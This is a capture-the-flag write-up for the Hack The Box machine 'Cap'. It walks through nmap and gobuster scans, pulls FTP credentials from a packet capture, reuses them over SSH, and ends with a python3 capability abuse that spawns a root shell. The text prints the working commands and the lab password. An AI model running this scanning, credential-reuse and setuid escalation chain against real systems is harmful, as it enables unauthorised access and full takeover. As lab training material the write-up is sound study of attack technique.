# cap ,HTB 28 JUL 2021 
#ip:10.10.10.245

![70ea3357a2d090af11a0953ec8717e90](https://user-images.githubusercontent.com/67979878/127354448-dbdd2b99-0c74-4082-bcbf-39dd70fff100.png)

SCANNING
========
intial
------
$nmap -sV -v  -oN nmap/intial 10.10.10.245         

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn

```                          
### the full scan return same results .

searching for exploits for services running :

[*] non found to get rce .

searching for exploits for technologies used on the web page "bootstrap 4.0.0 , jquery 2.2.4 and others"

[*]non found to get rce .                          

-you can know technologies used via wappalayzer .


ENUMRATION
===========

$ftp 10.10.10.245 

[*]failed to log in as anonymous :(

$ gobuster dir -u "http://10.10.10.245/" -w=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee gobuster.txt

```
/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]
/ip                   (Status: 200) [Size: 17465]                         
/netstat              (Status: 200) [Size: 32611]                         
/capture              (Status: 302) [Size: 220] [--> http://10.10.10.245/data/9]

```
### not much as these files is the tabs on the page :) .
How ever , 

/data is interesting . when i hit it by go-buster it has /9 , when i visit it i got /11

it seems there are a lot of pcap files in this /data , So starting from zero :) , download this file 


## WIRESHARK 

open this file with wireshark 

follow tcp stream on any packet 

```
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.

````

as we see it seems a user from the machine ip sent his credits unencrypted .

now we have credits !
=========================

USER nathan

PASS Buck3tH4TF0RM3!

[*]port 22 is open as we get from the nmap :) 

$ssh nathan@10.10.10.245 


==================WE ARE IN=====================


### now we can go ahead and read /home/nathan/user.txt 

PRIVILEGE ESCALATION
====================

$sudo -l 

X no sudo for nathan :( 

some checks :
-----------

#we can't write to /etc/passwd

#we can't read /etc/shadow 



searching for suid  :)
----------------------
$find / -type f -user root -perm -4000 -exec ls -l {} + 2>/dev/null


got alots of binaries but they are default or not interesting for https://gtfobins.github.io/


searching for kernel exploits 
------------------------------
$uname -ao

Linux cap 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux                

[*] no privilege escalation via kernel exploit  :( .


searching for capabilites 
------------------------
nathan@cap:/$ getcap -r / 2>/dev/null
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```


python ?


from : https://gtfobins.github.io/gtfobins/python/#capabilities


$python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'


#pwned .
